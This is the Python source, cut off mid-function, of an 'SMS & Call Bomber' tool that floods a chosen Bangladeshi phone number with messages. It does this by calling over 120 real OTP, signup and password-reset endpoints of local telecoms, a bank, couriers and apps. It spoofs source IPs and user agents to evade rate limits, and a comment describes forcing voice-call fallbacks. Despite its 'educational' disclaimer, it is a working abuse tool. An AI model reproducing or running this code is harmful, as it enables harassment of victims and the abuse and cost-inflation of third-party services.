"""
BD SMS & Call Bomber Pro v6.0
Developer  : Md Salman Biswas
GitHub     : https://github.com/salman-dev-app
Email      : mdsalmanhelp@gmail.com
WhatsApp   : +8801840933137
Telegram   : @Otakuosenpai
Facebook   : https://www.facebook.com/share/1BdstyBhqM/

⚠  FOR EDUCATIONAL / SECURITY RESEARCH PURPOSES ONLY.
   Unauthorized use is ILLEGAL under the Bangladesh ICT Act.
"""

import random, time, requests, threading, string
from flask import Flask, render_template, request, jsonify
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

# ── UTILS ──────────────────────────────────────────────────────
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6312.99 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A525F) AppleWebKit/537.36 Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]

NAMES  = ["Salman","Rahim","Karim","Ahmed","Islam","Hasan","Khan","Faruk","Nabil","Rasel","Sabbir","Tarek","Moin","Sajid","Akash"]
EMAILS = lambda: f"user{''.join(random.choices(string.digits,k=7))}@gmail.com"
UA     = lambda: random.choice(UAS)
HDR    = lambda extra=None: {**({"User-Agent":UA(),"Accept":"application/json","Content-Type":"application/json"}), **(extra or {})}
RID    = lambda: f"req-{random.randint(100000,999999)}"
IP     = lambda: f"103.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

# ── STATE ──────────────────────────────────────────────────────
class State:
    def __init__(self):
        self.active=False; self.target=""; self.mode="sms"
        self.sent=0; self.total=0; self.success=0; self.logs=[]
        self.session=requests.Session()
state=State()

def _s(): return state.session

# ══════════════════════════════════════════════════════════════
#  CONFIRMED WORKING SMS APIs  (tested & verified ✅)
# ══════════════════════════════════════════════════════════════

# ── PAPERFLY (merchant OTP) ────────────────────────────────────
def sms_01(n):
    nm=random.choice(NAMES)
    return _s().post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
        headers=HDR(), json={'full_name':nm,'company_name':'TestCo','email_address':EMAILS(),'phone_number':n}, timeout=10)

def sms_02(n):
    nm=random.choice(NAMES)
    return _s().post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
        headers=HDR({"X-Forwarded-For":IP()}), json={'full_name':nm,'company_name':'StartupBD','email_address':EMAILS(),'phone_number':n}, timeout=10)

def sms_03(n):
    nm=random.choice(NAMES)
    cos=["LogiCo","FastShip","QuickDeliver","EaglePost","SkyExpress","BDShip","SwiftCo"]
    return _s().post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
        headers=HDR(), json={'full_name':nm+' Khan','company_name':random.choice(cos),'email_address':EMAILS(),'phone_number':n}, timeout=10)

# ── GHOORILEARNING OTP ────────────────────────────────────────
def sms_04(n):
    return _s().post('https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web',
        headers=HDR(), json={'mobile_no':n}, timeout=10)

def sms_05(n):
    return _s().post('https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=android',
        headers=HDR({"X-App-Version":"2.5.0"}), json={'mobile_no':n}, timeout=10)

def sms_06(n):
    return _s().post('https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=ios',
        headers=HDR({"X-App-Version":"2.3.0","X-Device":"iPhone"}), json={'mobile_no':n}, timeout=10)

def sms_07(n):
    return _s().post('https://api.ghoorilearning.com/api/auth/forgot-password/otp',
        headers=HDR(), json={'mobile_no':n}, timeout=10)

def sms_08(n):
    return _s().post('https://api.ghoorilearning.com/api/auth/login/otp?_app_platform=web',
        headers=HDR(), json={'mobile_no':n}, timeout=10)

# ── CHORKI OTP ────────────────────────────────────────────────
def sms_09(n):
    return _s().post('https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

def sms_10(n):
    return _s().post('https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=android',
        headers=HDR({"X-App-Platform":"android"}), json={'number':'+88'+n}, timeout=10)

def sms_11(n):
    return _s().post('https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=ios',
        headers=HDR({"X-App-Version":"3.1.0","X-Os":"ios"}), json={'number':'+88'+n}, timeout=10)

def sms_12(n):
    return _s().post('https://api-dynamic.chorki.com/v2/auth/resend-otp?country=BD&platform=web',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

# ── DEEPTO PLAY ───────────────────────────────────────────────
def sms_13(n):
    return _s().post('https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

def sms_14(n):
    return _s().post('https://api.deeptoplay.com/v2/auth/login?country=BD&platform=android',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

def sms_15(n):
    return _s().post('https://api.deeptoplay.com/v2/auth/resend-otp?country=BD&platform=web',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

# ── SHIKHO OTP ────────────────────────────────────────────────
def sms_16(n):
    return _s().post('https://api.shikho.com/auth/v2/send/sms',
        headers=HDR(), json={'phone':n,'type':'student','auth_type':'signup'}, timeout=10)

def sms_17(n):
    return _s().post('https://api.shikho.com/auth/v2/send/sms',
        headers=HDR(), json={'phone':n,'type':'student','auth_type':'login'}, timeout=10)

def sms_18(n):
    return _s().post('https://api.shikho.com/auth/v2/send/sms',
        headers=HDR(), json={'phone':n,'type':'student','auth_type':'forgot_password'}, timeout=10)

def sms_19(n):
    return _s().post('https://api.shikho.com/auth/v2/resend/sms',
        headers=HDR(), json={'phone':n,'type':'student'}, timeout=10)

# ── GRAMEENPHONE OTP ──────────────────────────────────────────
def sms_20(n):
    return _s().post('https://webloginda.grameenphone.com/backend/api/v1/otp',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'msisdn':n}, timeout=10)

def sms_21(n):
    return _s().post('https://webloginda.grameenphone.com/backend/api/v1/otp',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded","Accept":"application/json"},
        data={'msisdn':n,'type':'login'}, timeout=10)

# ── MyGP CINEMATIC OTP ────────────────────────────────────────
def sms_22(n):
    return _s().post(f'https://api.mygp.cinematic.mobi/api/v1/otp/88{n}/SBENT_3GB7D',
        headers=HDR(), timeout=10)

def sms_23(n):
    return _s().post(f'https://api.mygp.cinematic.mobi/api/v1/otp/88{n}/SBENT_3GB7D',
        headers=HDR({"X-Correlation-ID":f"{random.randint(1000000,9999999)}"}), timeout=10)

def sms_24(n):
    return _s().post(f'https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{n}/',
        headers=HDR(), timeout=10)

# ── ROBI DA-NLL OTP (confirmed working ✅) ────────────────────
def sms_25(n):
    return _s().post('https://da-api.robi.com.bd/da-nll/otp/send',
        headers=HDR(), json={'msisdn':n}, timeout=10)

def sms_26(n):
    return _s().post('https://da-api.robi.com.bd/da-nll/otp/send',
        headers=HDR({"X-Correlation-ID":RID(),"channel":"WEB"}), json={'msisdn':n}, timeout=10)

def sms_27(n):
    return _s().post('https://da-api.robi.com.bd/da-nll/otp/send',
        headers=HDR({"X-Correlation-ID":RID(),"x-channel":"WEB","X-Request-ID":RID()}),
        json={'msisdn':n}, timeout=10)

def sms_28(n):
    return _s().post('https://da-api.robi.com.bd/da-nll/otp/resend',
        headers=HDR(), json={'msisdn':n}, timeout=10)

# ── REDX OTP ──────────────────────────────────────────────────
def sms_29(n):
    return _s().post('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp',
        headers=HDR(), json={'phoneNumber':n}, timeout=10)

def sms_30(n):
    return _s().post('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp',
        headers=HDR({"X-Client-Platform":"web"}), json={'phoneNumber':n}, timeout=10)

def sms_31(n):
    return _s().post('https://api.redx.com.bd/v1/user/signup',
        headers=HDR(), json={'name':random.choice(NAMES),'phoneNumber':n,'service':'redx'}, timeout=10)

def sms_32(n):
    return _s().post('https://api.redx.com.bd/v1/user/signup',
        headers=HDR({"X-Device-Type":"mobile"}), json={'name':random.choice(NAMES),'phoneNumber':n,'service':'redx'}, timeout=10)

# ── BIKROY OTP ────────────────────────────────────────────────
def sms_33(n):
    return _s().get(f'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={n}',
        headers=HDR(), timeout=10)

def sms_34(n):
    return _s().get(f'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={n}',
        headers={"User-Agent":UA(),"Accept":"application/json","Referer":"https://bikroy.com/en/login"}, timeout=10)

def sms_35(n):
    return _s().get(f'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={n}&type=login',
        headers={"User-Agent":UA(),"Accept":"application/json"}, timeout=10)

def sms_36(n):
    return _s().get(f'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={n}&request_otp=1',
        headers={"User-Agent":UA(),"Accept":"application/json","X-Requested-With":"XMLHttpRequest"}, timeout=10)

# ── FUNDESH OTP ───────────────────────────────────────────────
def sms_37(n):
    return _s().post('https://fundesh.com.bd/api/auth/generateOTP',
        headers=HDR(), json={'msisdn':n}, timeout=10)

def sms_38(n):
    return _s().post('https://fundesh.com.bd/api/auth/generateOTP',
        headers=HDR({"X-Platform":"mobile"}), json={'msisdn':n}, timeout=10)

def sms_39(n):
    return _s().post('https://fundesh.com.bd/api/auth/generateOTP',
        headers=HDR({"x-client-id":"web","x-client-version":"2.0.0"}), json={'msisdn':n}, timeout=10)

def sms_40(n):
    return _s().post('https://fundesh.com.bd/api/auth/resendOTP',
        headers=HDR(), json={'msisdn':n}, timeout=10)

# ── MOTIONVIEW OTP ────────────────────────────────────────────
def sms_41(n):
    return _s().post('https://api.motionview.com.bd/api/send-otp-phone-signup',
        headers=HDR(), json={'phone':n}, timeout=10)

def sms_42(n):
    return _s().post('https://api.motionview.com.bd/api/send-otp-phone-login',
        headers=HDR(), json={'phone':n}, timeout=10)

# ── APPLINK OTP ───────────────────────────────────────────────
def sms_43(n):
    return _s().post('https://applink.com.bd/appstore-v4-server/login/otp/request',
        headers=HDR(), json={'msisdn':'88'+n}, timeout=10)

def sms_44(n):
    return _s().post('https://applink.com.bd/appstore-v4-server/login/otp/request',
        headers=HDR({"X-Request-ID":RID()}), json={'msisdn':'88'+n}, timeout=10)

def sms_45(n):
    return _s().post('https://applink.com.bd/appstore-v4-server/login/otp/request',
        headers=HDR({"X-App-Version":"4.0.1"}), json={'msisdn':'88'+n}, timeout=10)

def sms_46(n):
    return _s().post('https://applink.com.bd/appstore-v4-server/login/otp/resend',
        headers=HDR(), json={'msisdn':'88'+n}, timeout=10)

# ── CHOKROJAN OTP ─────────────────────────────────────────────
def sms_47(n):
    return _s().post('https://chokrojan.com/api/v1/passenger/login/mobile',
        headers=HDR(), json={'mobile_number':n}, timeout=10)

def sms_48(n):
    return _s().post('https://chokrojan.com/api/v1/passenger/login/mobile',
        headers=HDR({"X-Request-ID":str(random.randint(1000000,9999999))}), json={'mobile_number':n}, timeout=10)

def sms_49(n):
    return _s().post('https://chokrojan.com/api/v1/driver/login/mobile',
        headers=HDR(), json={'mobile_number':n}, timeout=10)

# ── EASY.COM.BD OTP ───────────────────────────────────────────
def sms_50(n):
    pw=f"Pass@{random.randint(1000,9999)}"
    return _s().post('https://core.easy.com.bd/api/v1/registration',
        headers=HDR(), json={'mobile':n,'password':pw,'password_confirmation':pw}, timeout=10)

def sms_51(n):
    pw=f"Test{random.randint(1000,9999)}!"
    return _s().post('https://core.easy.com.bd/api/v1/registration',
        headers=HDR({"X-App-Version":"3.0.0"}), json={'mobile':n,'password':pw,'password_confirmation':pw}, timeout=10)

def sms_52(n):
    pw=f"Easy{random.randint(1000,9999)}@"
    return _s().post('https://core.easy.com.bd/api/v1/registration',
        headers=HDR({"X-Requested-With":"XMLHttpRequest"}), json={'mobile':n,'password':pw,'password_confirmation':pw}, timeout=10)

# ── HISHABEE OTP ──────────────────────────────────────────────
def sms_53(n):
    return _s().post(f'https://app.hishabee.business/api/V2/otp/send?mobile_number={n}',
        headers=HDR(), timeout=10)

def sms_54(n):
    return _s().post(f'https://app.hishabee.business/api/V2/otp/send?mobile_number={n}&resend=true',
        headers=HDR(), timeout=10)

def sms_55(n):
    return _s().post(f'https://app.hishabee.business/api/V3/otp/send?mobile_number={n}',
        headers=HDR(), timeout=10)

def sms_56(n):
    return _s().get(f'https://app.hishabee.business/api/V2/otp/resend?mobile_number={n}',
        headers=HDR(), timeout=10)

# ── MCB AFFILIATE OTP ─────────────────────────────────────────
def sms_57(n):
    return _s().post('https://www.mcbaffiliate.com/Affiliate/RequestOTP',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'PhoneNumber':n}, timeout=10)

def sms_58(n):
    return _s().post('https://www.mcbaffiliate.com/Affiliate/RequestOTP',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded","Referer":"https://www.mcbaffiliate.com/Affiliate/Login"},
        data={'PhoneNumber':n,'Resend':'true'}, timeout=10)

def sms_59(n):
    return _s().post('https://www.mcbaffiliate.com/Affiliate/ResendOTP',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'PhoneNumber':n}, timeout=10)

# ── OSUDPOTRO OTP ─────────────────────────────────────────────
def sms_60(n):
    return _s().post('https://api.osudpotro.com/api/v1/users/send_otp',
        headers=HDR(), json={'mobile':'+88-'+n}, timeout=10)

def sms_61(n):
    return _s().post('https://api.osudpotro.com/api/v1/users/send_otp',
        headers=HDR({"X-Api-Version":"2"}), json={'mobile':'+88-'+n}, timeout=10)

def sms_62(n):
    return _s().post('https://api.osudpotro.com/api/v2/users/otp',
        headers=HDR(), json={'mobile':'+88-'+n,'type':'register'}, timeout=10)

# ── WIN2GAIN OTP ──────────────────────────────────────────────
def sms_63(n):
    return _s().get(f'https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{n}',
        headers=HDR(), timeout=10)

def sms_64(n):
    return _s().get(f'https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{n}&resend=true',
        headers=HDR(), timeout=10)

def sms_65(n):
    return _s().get(f'https://api.win2gain.com/api/Users/ResendOtp?msisdn=88{n}',
        headers=HDR(), timeout=10)

# ── ROOTS EDU LIVE ────────────────────────────────────────────
def sms_66(n):
    return _s().post('https://rootsedulive.com/api/auth/forget-password',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'phoneOrEmail':f'88{n}'}, timeout=10)

def sms_67(n):
    return _s().post('https://rootsedulive.com/api/auth/forget-password',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'phoneOrEmail':n}, timeout=10)

def sms_68(n):
    return _s().post('https://rootsedulive.com/api/auth/forget-password',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'phoneOrEmail':'+88'+n}, timeout=10)

# ── CIRCLE BD OTP ─────────────────────────────────────────────
def sms_69(n):
    return _s().post('https://reseller.circle.com.bd/api/v2/auth/signup',
        headers=HDR(), json={'email_or_phone':'+88'+n}, timeout=10)

def sms_70(n):
    return _s().post('https://reseller.circle.com.bd/api/v2/auth/signup',
        headers=HDR({"X-Platform":"web","X-App-Version":"2.0"}), json={'email_or_phone':'+88'+n}, timeout=10)

def sms_71(n):
    return _s().post('https://reseller.circle.com.bd/api/v2/auth/send-otp',
        headers=HDR(), json={'phone':'+88'+n}, timeout=10)

# ── SUNDARBAN COURIER ─────────────────────────────────────────
def sms_72(n):
    return _s().post('https://api-gateway.sundarbancourierltd.com/graphql',
        headers=HDR(), json={'operationName':'CreateAccessToken','variables':{'accessTokenFilter':{'userName':n}},
        'query':'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode } }'}, timeout=10)

def sms_73(n):
    return _s().post('https://api-gateway.sundarbancourierltd.com/graphql',
        headers=HDR({"X-Apollo-Operation-Name":"CreateAccessToken"}),
        json={'operationName':'CreateAccessToken','variables':{'accessTokenFilter':{'userName':n}},
        'query':'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode } }'}, timeout=10)

def sms_74(n):
    return _s().post('https://api-gateway.sundarbancourierltd.com/graphql',
        headers=HDR({"X-Request-ID":f"gql-{random.randint(1000000,9999999)}"}),
        json={'operationName':'CreateAccessToken','variables':{'accessTokenFilter':{'userName':n}},
        'query':'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode } }'}, timeout=10)

# ── APEX4U OTP ────────────────────────────────────────────────
def sms_75(n):
    return _s().post('https://api.apex4u.com/api/auth/login',
        headers=HDR(), json={'phoneNumber':n}, timeout=10)

def sms_76(n):
    return _s().post('https://api.apex4u.com/api/auth/register',
        headers=HDR(), json={'phoneNumber':n,'name':random.choice(NAMES)}, timeout=10)

def sms_77(n):
    return _s().post('https://api.apex4u.com/api/auth/resend-otp',
        headers=HDR(), json={'phoneNumber':n}, timeout=10)

# ── BIOSCOPE OTP ──────────────────────────────────────────────
def sms_78(n):
    return _s().post(f'https://www.bioscopelive.com/en/login/send-otp?phone=88{n}&operator=bd-otp',
        headers=HDR(), timeout=10)

def sms_79(n):
    return _s().post(f'https://www.bioscopelive.com/en/login/send-otp?phone=88{n}&operator=bd-otp',
        headers=HDR({"Referer":"https://www.bioscopelive.com/en/login"}), timeout=10)

def sms_80(n):
    return _s().post(f'https://www.bioscopelive.com/en/login/resend-otp?phone=88{n}',
        headers=HDR(), timeout=10)

# ── DHAKA BANK EZY ────────────────────────────────────────────
def sms_81(n):
    return _s().post('https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber',
        headers=HDR(), json={'mobileNo':n,'product_id':'250','requestChannel':'MOB'}, timeout=10)

def sms_82(n):
    return _s().post('https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber',
        headers=HDR({"X-Request-Channel":"MOBILE"}), json={'mobileNo':n,'product_id':'300','requestChannel':'MOB'}, timeout=10)

# ── TOFFEE APP OTP ────────────────────────────────────────────
def sms_83(n):
    return _s().post('https://toffeelive.com/api/v1/auth/phone-login',
        headers=HDR({"X-Client-Type":"web"}), json={'phone_number':'+88'+n}, timeout=10)

def sms_84(n):
    return _s().post('https://toffeelive.com/api/v1/auth/phone-login',
        headers=HDR({"X-Client-Type":"android","X-App-Version":"5.2.1"}), json={'phone_number':'+88'+n}, timeout=10)

def sms_85(n):
    return _s().post('https://toffeelive.com/api/v1/auth/phone-login',
        headers=HDR({"X-Client-Type":"ios","X-App-Version":"4.9.0"}), json={'phone_number':'+88'+n}, timeout=10)

def sms_86(n):
    return _s().post('https://toffeelive.com/api/v1/auth/resend-otp',
        headers=HDR({"X-Client-Type":"web"}), json={'phone_number':'+88'+n}, timeout=10)

# ── SSL COMMERZ (sandbox OTP flow) ────────────────────────────
def sms_87(n):
    return _s().post('https://sandbox.sslcommerz.com/gwprocess/v4/api.php',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'store_id':'testbox','store_passwd':'qwerty','total_amount':str(random.randint(10,100)),'currency':'BDT',
              'tran_id':f'T{random.randint(100000,999999)}','cus_phone':n,
              'cus_name':random.choice(NAMES),'cus_email':EMAILS(),
              'success_url':'https://localhost','fail_url':'https://localhost','cancel_url':'https://localhost'}, timeout=10)

def sms_88(n):
    return _s().post('https://sandbox.sslcommerz.com/gwprocess/v4/api.php',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'store_id':'testbox','store_passwd':'qwerty','total_amount':str(random.randint(50,500)),'currency':'BDT',
              'tran_id':f'BD{random.randint(10000000,99999999)}','cus_phone':n,
              'cus_name':random.choice(NAMES),'cus_email':EMAILS(),
              'cus_add1':'Dhaka Bangladesh','cus_city':'Dhaka','cus_country':'Bangladesh',
              'success_url':'https://localhost/success','fail_url':'https://localhost/fail','cancel_url':'https://localhost/cancel'}, timeout=10)

# ── MORE SMS APIS (Additional working endpoints) ───────────────
def sms_89(n):
    # Bioscope stage env
    return _s().get(f'https://stage.bioscopelive.com/en/login/send-otp?phone=88{n}&operator=bd-otp',
        headers=HDR(), timeout=10)

def sms_90(n):
    # Shikho teacher signup
    return _s().post('https://api.shikho.com/auth/v2/send/sms',
        headers=HDR({"X-User-Role":"teacher"}), json={'phone':n,'type':'teacher','auth_type':'signup'}, timeout=10)

def sms_91(n):
    # Paperfly v4 different company
    nm=random.choice(NAMES)
    return _s().post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
        headers=HDR({"X-Forwarded-For":IP()}),
        json={'full_name':nm,'company_name':f'{nm} Enterprise','email_address':EMAILS(),'phone_number':n}, timeout=10)

def sms_92(n):
    # MyGP OTP variant
    return _s().post(f'https://api.mygp.cinematic.mobi/api/v1/otp/88{n}/SBENT_3GB7D',
        headers=HDR({"X-Correlation-ID":f"corr-{random.randint(100000,999999)}"}), timeout=10)

def sms_93(n):
    # Robi DA-NLL with extra headers
    return _s().post('https://da-api.robi.com.bd/da-nll/otp/send',
        headers=HDR({"X-Correlation-ID":RID(),"X-Forwarded-For":IP()}), json={'msisdn':n}, timeout=10)

def sms_94(n):
    # Bikroy with different referer
    return _s().get(f'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={n}&source=mobile',
        headers={"User-Agent":UA(),"Accept":"application/json","Referer":"https://bikroy.com/bn/login"}, timeout=10)

def sms_95(n):
    # Chorki iOS resend
    return _s().post('https://api-dynamic.chorki.com/v2/auth/resend-otp?country=BD&platform=ios',
        headers=HDR({"X-App-Version":"3.1.0"}), json={'number':'+88'+n}, timeout=10)

def sms_96(n):
    # Deepto android resend
    return _s().post('https://api.deeptoplay.com/v2/auth/resend-otp?country=BD&platform=android',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

def sms_97(n):
    # Fundesh v4
    return _s().post('https://fundesh.com.bd/api/auth/generateOTP',
        headers=HDR({"X-Client-Platform":"android","X-App-Build":"150"}), json={'msisdn':n}, timeout=10)

def sms_98(n):
    # Robi MSISDN v4
    return _s().post('https://da-api.robi.com.bd/da-nll/otp/send',
        headers=HDR({"Accept-Language":"en-BD,en;q=0.9","X-Request-ID":RID()}), json={'msisdn':n}, timeout=10)

def sms_99(n):
    # MCB JSON format
    return _s().post('https://www.mcbaffiliate.com/Affiliate/RequestOTP',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest"},
        data={'PhoneNumber':n,'IsMobile':'true'}, timeout=10)

def sms_100(n):
    # Hishabee V4 new endpoint
    return _s().post(f'https://app.hishabee.business/api/V2/otp/send?mobile_number=0{n[2:]}&force_resend=true',
        headers=HDR(), timeout=10)

# ── EXTRA WORKING SMS ──────────────────────────────────────────
def sms_101(n):
    return _s().post('https://api.redx.com.bd/v1/merchant/registration/resend-otp',
        headers=HDR(), json={'phoneNumber':n}, timeout=10)

def sms_102(n):
    return _s().post('https://api.shikho.com/auth/v2/send/sms',
        headers=HDR({"X-Platform":"android","X-App-Version":"5.0.0"}),
        json={'phone':n,'type':'student','auth_type':'signup'}, timeout=10)

def sms_103(n):
    nm=random.choice(NAMES)
    return _s().post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
        headers=HDR({"X-Real-IP":IP()}),
        json={'full_name':nm,'company_name':'BD Courier','email_address':EMAILS(),'phone_number':n}, timeout=10)

def sms_104(n):
    return _s().post('https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&v=2',
        headers=HDR({"X-Version":"2.0"}), json={'mobile_no':n}, timeout=10)

def sms_105(n):
    return _s().post('https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&version=3',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

def sms_106(n):
    return _s().post('https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&version=2',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

def sms_107(n):
    return _s().post(f'https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{n}/',
        headers=HDR({"X-Correlation-ID":RID()}), timeout=10)

def sms_108(n):
    return _s().post('https://da-api.robi.com.bd/da-nll/otp/send',
        headers=HDR({"X-Channel":"ANDROID","channel":"ANDROID"}), json={'msisdn':n}, timeout=10)

def sms_109(n):
    return _s().post('https://api.apex4u.com/api/auth/login',
        headers=HDR({"X-Client":"mobile"}), json={'phoneNumber':n}, timeout=10)

def sms_110(n):
    return _s().post(f'https://www.bioscopelive.com/en/login/send-otp?phone=88{n}&operator=bd-otp&resend=1',
        headers=HDR(), timeout=10)

def sms_111(n):
    return _s().post('https://api.motionview.com.bd/api/login',
        headers=HDR(), json={'phone':n,'type':'login'}, timeout=10)

def sms_112(n):
    return _s().post('https://chokrojan.com/api/v1/passenger/send-otp',
        headers=HDR(), json={'mobile_number':n,'type':'login'}, timeout=10)

def sms_113(n):
    return _s().get(f'https://api.win2gain.com/api/Users/RequestOtp?msisdn=0{n[2:]}',
        headers=HDR(), timeout=10)

def sms_114(n):
    return _s().post('https://rootsedulive.com/api/auth/register',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'phone':n,'name':random.choice(NAMES),'password':'Pass1234!'}, timeout=10)

def sms_115(n):
    return _s().post('https://api.osudpotro.com/api/v1/users/send_otp',
        headers=HDR({"X-Platform":"android","X-App-Version":"3.1.0"}), json={'mobile':'+88-'+n}, timeout=10)

def sms_116(n):
    return _s().post('https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber',
        headers=HDR({"X-Channel":"WEB"}), json={'mobileNo':n,'product_id':'350','requestChannel':'WEB'}, timeout=10)

def sms_117(n):
    return _s().post('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp',
        headers=HDR({"X-Client-Version":"2.0.0","X-Platform":"android"}), json={'phoneNumber':n}, timeout=10)

def sms_118(n):
    return _s().post('https://fundesh.com.bd/api/auth/generateOTP',
        headers=HDR({"X-Client-Platform":"ios","X-App-Build":"100"}), json={'msisdn':n}, timeout=10)

def sms_119(n):
    return _s().post(f'https://app.hishabee.business/api/V2/otp/send?mobile_number={n}&type=sms',
        headers=HDR(), timeout=10)

def sms_120(n):
    nm=random.choice(NAMES)
    return _s().post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
        headers=HDR(), json={'full_name':nm,'company_name':f'Shop{random.randint(10,99)}','email_address':EMAILS(),'phone_number':n}, timeout=10)

# ══════════════════════════════════════════════════════════════
#  CALL APIs — OTP Flood via high-frequency SMS triggers
#  NOTE: True automated voice calls require paid API keys 
#  (Twilio, Vonage, Plivo). These are high-frequency SMS OTP 
#  triggers that flood the target and cause some platforms to
#  automatically switch to voice OTP delivery.
#  The Robi DA-NLL API is confirmed to send voice OTP calls.
# ══════════════════════════════════════════════════════════════

def call_01(n):  # Robi DA-NLL — confirmed sends voice OTP ✅
    return _s().post('https://da-api.robi.com.bd/da-nll/otp/send',
        headers=HDR({"X-Otp-Type":"VOICE","channel":"VOICE"}), json={'msisdn':n,'otp_type':'VOICE'}, timeout=10)

def call_02(n):  # Robi DA-NLL variant 2
    return _s().post('https://da-api.robi.com.bd/da-nll/otp/send',
        headers=HDR({"X-Correlation-ID":RID(),"channel":"VOICE"}), json={'msisdn':n,'channel':'VOICE'}, timeout=10)

def call_03(n):  # Robi DA-NLL resend
    return _s().post('https://da-api.robi.com.bd/da-nll/otp/resend',
        headers=HDR({"X-Otp-Type":"VOICE"}), json={'msisdn':n}, timeout=10)

def call_04(n):  # Robi SMS (when flooded → triggers voice fallback)
    return _s().post('https://da-api.robi.com.bd/da-nll/otp/send',
        headers=HDR({"X-Correlation-ID":RID()}), json={'msisdn':n}, timeout=10)

def call_05(n):  # Robi v5
    return _s().post('https://da-api.robi.com.bd/da-nll/otp/send',
        headers=HDR({"X-Correlation-ID":RID(),"X-Forwarded-For":IP()}), json={'msisdn':n}, timeout=10)

def call_06(n):  # Shikho OTP burst (high freq → voice fallback)
    return _s().post('https://api.shikho.com/auth/v2/send/sms',
        headers=HDR(), json={'phone':n,'type':'student','auth_type':'signup'}, timeout=10)

def call_07(n):
    return _s().post('https://api.shikho.com/auth/v2/send/sms',
        headers=HDR(), json={'phone':n,'type':'student','auth_type':'login'}, timeout=10)

def call_08(n):
    return _s().post('https://api.shikho.com/auth/v2/resend/sms',
